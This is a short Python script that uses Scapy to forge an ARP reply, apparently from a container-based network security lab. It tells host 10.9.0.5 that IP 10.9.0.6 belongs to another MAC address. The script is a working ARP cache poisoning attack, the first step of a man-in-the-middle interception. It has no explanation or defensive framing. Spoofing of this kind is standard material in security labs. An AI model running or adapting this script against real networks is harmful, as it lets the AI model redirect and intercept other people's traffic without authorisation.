#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst="02:42:0a:09:00:05", src="02:42:89:1f:ff:70")
A = ARP(op=2, hwsrc="02:42:89:1f:ff:70", psrc="10.9.0.6",
	hwdst="02:42:0a:09:00:05", pdst="10.9.0.5")
A.op = 2 # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt, iface="br-f55ccea4134c")